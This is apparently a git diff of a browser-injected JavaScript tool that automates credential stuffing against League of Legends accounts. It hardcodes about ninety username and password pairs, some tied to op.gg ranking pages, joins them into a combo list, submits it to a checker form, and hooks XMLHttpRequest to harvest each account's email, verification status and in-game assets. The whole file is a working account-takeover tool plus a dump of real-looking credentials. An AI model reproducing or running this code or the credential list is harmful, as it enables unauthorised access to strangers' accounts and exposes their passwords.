@@ -9,152 +9,359 @@
   };
   const list = document.getElementById("cclist");
   const server = document.getElementById("server");
-  let accounts = [
-    {
-      UserName: "LunaspiriT",
-      Password: "D74516EFD92B4C519790028eca157b7a",
-      FromUrl: "https://euw.op.gg/ranking/level/page=178998",
-    },
-    {
-      UserName: "Luxana98",
-      Password: "luxana98",
-    },
-    {
-      UserName: "erhphpdgpodfkh",
-      Password: "erhphpdgpodfkh1",
-      FromUrl: "https://las.op.gg/ranking/level/page=15960",
-    },
-    {
-      UserName: "NaberMoruk41",
-      Password: "nabermoruk41",
-      FromUrl: "https://tr.op.gg/ranking/level/page=19454",
-    },
-    {
-      UserName: "Merunix",
-      Password: "Merunix123",
-      FromUrl: "https://euw.op.gg/ranking/level/page=94962",
-    },
-    {
-      UserName: "WolfBangBang",
-      Password: "wolfbangbang123",
-      FromUrl: "https://br.op.gg/ranking/level/page=29961",
-    },
-    {
-      UserName: "xDeathForeverx",
-      Password: "abc123",
-      FromUrl: "https://lan.op.gg/ranking/level/page=16663",
-    },
-    {
-      UserName: "Jiga1UP",
-      Password: "jiga1up",
-      FromUrl: "https://eune.op.gg/ranking/level/page=165201",
-    },
-    {
-      UserName: "Darklordrox",
-      Password: "darklordrox123",
-      FromUrl: "https://oce.op.gg/ranking/level/page=6491",
-    },
-    {
-      UserName: "NymphomaNN",
-      Password: "nymphomann1",
-      FromUrl: "https://tr.op.gg/ranking/level/page=19437",
-    },
-    {
-      UserName: "Dragox7172",
-      Password: "dragox7172",
-      FromUrl: "https://las.op.gg/ranking/level/page=15444",
-    },
-    {
-      UserName: "WaffleCream",
-      Password: "wafflecream1",
-      FromUrl: "https://oce.op.gg/ranking/level/page=6471",
-    },
-    {
-      UserName: "Tatane123",
-      Password: "tatane123",
-      FromUrl: "https://euw.op.gg/ranking/level/page=94428",
-    },
-    {
-      UserName: "Espejo64",
-      Password: "espejo64",
-      FromUrl: "https://lan.op.gg/ranking/level/page=16128",
-    },
-    {
-      UserName: "Brancisco",
-      Password: "brancisco1",
-      FromUrl: "https://oce.op.gg/ranking/level/page=6470",
-    },
-    {
-      UserName: "picpick",
-      Password: "picpick123",
-      FromUrl: "https://www.op.gg/ranking/level/page=82928",
-    },
-    {
-      UserName: "kelin1115",
-      Password: "kelin1115",
-      FromUrl: "https://ru.op.gg/ranking/level/page=17220",
-    },
-    {
-      UserName: "PabloATR",
-      Password: "pabloatr123",
-      FromUrl: "https://las.op.gg/ranking/level/page=15434",
-    },
-    {
-      UserName: "cataphyllary71",
-      Password: "abc123",
-      FromUrl: "https://na.op.gg/ranking/level/page=65911",
-    },
-    {
-      UserName: "Hermes123456",
-      Password: "hermes123456",
-      FromUrl: "https://las.op.gg/ranking/level/page=15418",
-    },
-    {
-      UserName: "Daidon",
-      Password: "abc123",
-      FromUrl: "https://br.op.gg/ranking/level/page=29404",
-    },
-    {
-      UserName: "darkfire879",
-      Password: "darkfire879",
-      FromUrl: "https://las.op.gg/ranking/level/page=15403",
-    },
-    {
-      UserName: "temo1010",
-      Password: "temo1010",
-      FromUrl: "https://ru.op.gg/ranking/level/page=17195",
-    },
-    {
-      UserName: "miticomitico",
-      Password: "miticomitico123",
-      FromUrl: "https://br.op.gg/ranking/level/page=29391",
-    },
-    {
-      UserName: "Martin080901",
-      Password: "Martin080901",
-      FromUrl: "https://euw.op.gg/ranking/level/page=94386",
-    },
-    {
-      UserName: "DemonSnake1",
-      Password: "demonsnake1",
-      FromUrl: "https://las.op.gg/ranking/level/page=15407",
-    },
-    {
-      UserName: "vanminh2016",
-      Password: "vanminh2016",
-      FromUrl: "https://jp.op.gg/ranking/level/page=14281",
-    },
-    {
-      UserName: "Emiratiyah",
-      Password: "emiratiyah123",
-      FromUrl: "https://oce.op.gg/ranking/level/page=6425",
-    },
-    {
-      UserName: "SneakyWizZi",
-      Password: "sneakywizzi1",
-      FromUrl: "https://jp.op.gg/ranking/level/page=14281",
-    },
-  ];
+  let accounts =
+    /* 1 */
+    [
+      {
+        UserName: "Luxana98",
+        Password: "luxana98",
+      },
+      {
+        UserName: "Jiga1UP",
+        Password: "jiga1up",
+      },
+      {
+        UserName: "Dragox7172",
+        Password: "dragox7172",
+      },
+      {
+        UserName: "WaffleCream",
+        Password: "wafflecream1",
+      },
+      {
+        UserName: "Espejo64",
+        Password: "espejo64",
+      },
+      {
+        UserName: "Brancisco",
+        Password: "brancisco1",
+      },
+      {
+        UserName: "picpick",
+        Password: "picpick123",
+      },
+      {
+        UserName: "PabloATR",
+        Password: "pabloatr123",
+      },
+      {
+        UserName: "cataphyllary71",
+        Password: "abc123",
+      },
+      {
+        UserName: "Hermes123456",
+        Password: "hermes123456",
+      },
+      {
+        UserName: "Daidon",
+        Password: "abc123",
+      },
+      {
+        UserName: "darkfire879",
+        Password: "darkfire879",
+      },
+      {
+        UserName: "temo1010",
+        Password: "temo1010",
+      },
+      {
+        UserName: "miticomitico",
+        Password: "miticomitico123",
+      },
+      {
+        UserName: "DemonSnake1",
+        Password: "demonsnake1",
+      },
+      {
+        UserName: "Emiratiyah",
+        Password: "emiratiyah123",
+      },
+      {
+        UserName: "SneakyWizZi",
+        Password: "sneakywizzi1",
+      },
+      {
+        UserName: "lingenchi07",
+        Password: "lingenchi07",
+      },
+      {
+        UserName: "KeeperFantastic",
+        Password: "KeeperFantastic123",
+      },
+      {
+        UserName: "tomax8008",
+        Password: "tomax8008",
+      },
+      {
+        UserName: "MigthyCarp27",
+        Password: "migthycarp27",
+      },
+      {
+        UserName: "CemalBurn",
+        Password: "cemalburn123",
+      },
+      {
+        UserName: "RedDrifter",
+        Password: "qwerty1",
+      },
+      {
+        UserName: "SuntMamaTa",
+        Password: "suntmamata1",
+      },
+      {
+        UserName: "Nikolaolcan98",
+        Password: "nikolaolcan98",
+      },
+      {
+        UserName: "doy12345678",
+        Password: "doy12345678",
+      },
+      {
+        UserName: "patri31",
+        Password: "patri31",
+      },
+      {
+        UserName: "dobsacsaba90",
+        Password: "dobsacsaba90",
+      },
+      {
+        UserName: "amitagmon",
+        Password: "amitagmon1",
+      },
+      {
+        UserName: "SebasVargas",
+        Password: "sebasvargas1",
+      },
+      {
+        UserName: "sofmap03",
+        Password: "sofmap03",
+      },
+      {
+        UserName: "matrexguede",
+        Password: "matrexguede123",
+      },
+      {
+        UserName: "joseph0604",
+        Password: "joseph0604",
+      },
+      {
+        UserName: "AKUMA1408",
+        Password: "akuma1408",
+      },
+      {
+        UserName: "Miguelziin",
+        Password: "miguelziin123",
+      },
+      {
+        UserName: "DarkPidgey",
+        Password: "DarkPidgey12",
+      },
+      {
+        UserName: "AcnaAneliram6",
+        Password: "acnaaneliram6",
+      },
+      {
+        UserName: "R6I6P6",
+        Password: "r6i6p6",
+      },
+      {
+        UserName: "doquochuy",
+        Password: "doquochuy123",
+      },
+      {
+        UserName: "doquochuy",
+        Password: "doquochuy123",
+      },
+      {
+        UserName: "shyealn01",
+        Password: "shyealn01",
+      },
+      {
+        UserName: "jsoares22",
+        Password: "jsoares22",
+      },
+      {
+        UserName: "Miguelgg17",
+        Password: "miguelgg17",
+      },
+      {
+        UserName: "yosoygen",
+        Password: "yosoygen1",
+      },
+      {
+        UserName: "Michocraft74",
+        Password: "Michocraft74",
+      },
+      {
+        UserName: "Kurtesh",
+        Password: "kurtesh123",
+      },
+      {
+        UserName: "FrankTheTank355",
+        Password: "FrankTheTank355",
+      },
+      {
+        UserName: "Mategol9",
+        Password: "Mategol9",
+      },
+      {
+        UserName: "JoelColoma1",
+        Password: "JoelColoma1",
+      },
+      {
+        UserName: "cachicama",
+        Password: "cachicama123",
+      },
+      {
+        UserName: "ismael2112",
+        Password: "ismael2112",
+      },
+      {
+        UserName: "DarkieCZ",
+        Password: "darkiecz1",
+      },
+      {
+        UserName: "Esstas",
+        Password: "Esstas1",
+      },
+      {
+        UserName: "turusuk",
+        Password: "turusuk123",
+      },
+      {
+        UserName: "shirlyy123",
+        Password: "shirlyy123",
+      },
+      {
+        UserName: "hickusku",
+        Password: "hickusku123",
+      },
+      {
+        UserName: "iguanodon1",
+        Password: "iguanodon1",
+      },
+      {
+        UserName: "00Flower00",
+        Password: "qwerty123",
+      },
+      {
+        UserName: "ekaitz7445",
+        Password: "ekaitz7445",
+      },
+      {
+        UserName: "TaroYamada3",
+        Password: "taroyamada3",
+      },
+      {
+        UserName: "tiocalamardo",
+        Password: "tiocalamardo123",
+      },
+      {
+        UserName: "clavero25",
+        Password: "clavero25",
+      },
+      {
+        UserName: "kostaskill16",
+        Password: "kostaskill16",
+      },
+      {
+        UserName: "STDMX",
+        Password: "STDMX123",
+      },
+      {
+        UserName: "Keira2502",
+        Password: "keira2502",
+      },
+      {
+        UserName: "siyarlar",
+        Password: "siyarlar123",
+      },
+      {
+        UserName: "locazo1996",
+        Password: "locazo1996",
+      },
+      {
+        UserName: "ElTanque10",
+        Password: "eltanque10",
+      },
+      {
+        UserName: "66adc66",
+        Password: "66adc66",
+      },
+      {
+        UserName: "SaenzSP23",
+        Password: "SaenzSP23",
+      },
+      {
+        UserName: "Jfox0804",
+        Password: "Jfox0804",
+      },
+      {
+        UserName: "seanjkim1",
+        Password: "seanjkim1",
+      },
+      {
+        UserName: "DiamondManageR",
+        Password: "diamondmanager1",
+      },
+      {
+        UserName: "ElZeus3k",
+        Password: "elzeus3k",
+      },
+      {
+        UserName: "loluserrr",
+        Password: "password1",
+      },
+      {
+        UserName: "yoimer07",
+        Password: "yoimer07",
+      },
+      {
+        UserName: "DerSlashe",
+        Password: "derslashe",
+      },
+      {
+        UserName: "LordOfSummons",
+        Password: "qwerty1234",
+      },
+      {
+        UserName: "canar11o",
+        Password: "qwerty1",
+      },
+      {
+        UserName: "The Sniper Jow",
+        Password: "password",
+      },
+      {
+        UserName: "Sheet of night",
+        Password: "sheet of night12345678",
+      },
+      {
+        UserName: "10270243_DEL",
+        Password: "12345678",
+      },
+      {
+        UserName: "Unique jeDo",
+        Password: "UniquejeDo",
+      },
+      {
+        UserName: "1good night1",
+        Password: "1goodnight1",
+      },
+      {
+        UserName: "iPhone 5S Plus",
+        Password: "iPhone_5S_Plus",
+      },
+      {
+        UserName: "あくのすうじくん",
+        Password: "12345678",
+      },
+      {
+        UserName: "yoimer07",
+        Password: "yoimer07",
+      },
+    ];
+
   const serverMapper = {
     "1": (url) => (url || "").startsWith("https://br.op.gg"),
     "2": (url) => (url || "").startsWith("https://eune.op.gg"),
@@ -167,24 +374,7 @@
     "9": (url) => (url || "").startsWith("https://oce.op.gg"),
     "11": (url) => (url || "").startsWith("https://ru.op.gg"),
     "12": (url) => (url || "").startsWith("https://tr.op.gg"),
-    GetAccounts() {
-      const keys = Object.keys(this);
-      const accs = {};
-      for (let i = 0; i < keys.length; i += 1) {
-        if (isNaN(+keys[i])) continue;
-        for (let ii = 0; ii < accounts.length; ii += 1) {
-          if (this[keys[i]](accounts[ii].FromUrl)) {
-            if (!accs[keys[i]]) accs[keys[i]] = [];
-            accs[keys[i]].push(accounts[ii]);
-          }
-        }
-      }
-      return accs;
-    },
   };
-  accounts = serverMapper.GetAccounts();
-  const keys = Object.keys(accounts);
-  let currKey = -1;
   let updates = [];
   const getUpdate = (data) =>
     updates
@@ -212,10 +402,12 @@
           const table = document.createElement("table");
           table.innerHTML = body.icerik;
           const trs = table.getElementsByTagName("tr");
+          const newUsernames = [];
           for (let i = 0; i < trs.length; i += 1) {
             const tr = trs[i];
             const [, userData, capture] = tr.getElementsByTagName("td");
             const [UserName] = userData.innerHTML.split(":");
+            newUsernames.push(UserName);
             let [
               RP,
               BlueEssence,
@@ -230,12 +422,12 @@
               where: { UserName },
               set: {
                 $set: {
-                  Level: +Level.split(":")[1].trim() || 0,
-                  RP: +RP.split(":")[1].trim() || 0,
-                  BlueEssence: +BlueEssence.split(":")[1].trim() || 0,
-                  RefundsRemaining: +RefundsRemaining.split(":")[1].trim() || 0,
-                  TotalChamps: +TotalChamps.split(":")[1].trim() || 0,
-                  TotalSkins: +TotalSkins.split(":")[1].trim() || 0,
+                  // Level: +Level.split(":")[1].trim() || 0,
+                  // RP: +RP.split(":")[1].trim() || 0,
+                  // BlueEssence: +BlueEssence.split(":")[1].trim() || 0,
+                  // RefundsRemaining: +RefundsRemaining.split(":")[1].trim() || 0,
+                  // TotalChamps: +TotalChamps.split(":")[1].trim() || 0,
+                  // TotalSkins: +TotalSkins.split(":")[1].trim() || 0,
                   Email: Email.split(":")[1].trim() || "",
                   EmailVerified:
                     EmailVerified.split(":")[1].trim() === "Verified",
@@ -246,6 +438,9 @@
             console.clear();
             console.log(getUpdate(updates));
           }
+          accounts = accounts.filter(
+            (account) => !newUsernames.includes(account.UserName)
+          );
         } catch (e) {}
       },
       false
@@ -254,9 +449,11 @@
   }
   window.XMLHttpRequest = newXHR;
 
-  // console.clear();
+  console.clear();
   function startQuery(accs) {
     if (!accs) return;
+    if (!serverMapper[list.value]) return;
+    server.value = list.value;
     const submit = document.getElementById("submit");
     let comboText = "";
     for (let i = 0; i < accs.length; i += 1) {
@@ -264,15 +461,11 @@
       comboText += accs[i].UserName + ":" + accs[i].Password;
     }
     list.value = comboText;
-    server.value = keys[currKey];
     submit.click();
   }
   const start = () => {
-    currKey += 1;
-    updates = [];
-    startQuery(accounts[keys[currKey]]);
+    startQuery(accounts);
   };
-  // setTimeout(start, 1500);
   console.clear();
   console.log("accounts", accounts);
   list.addEventListener("click", start);
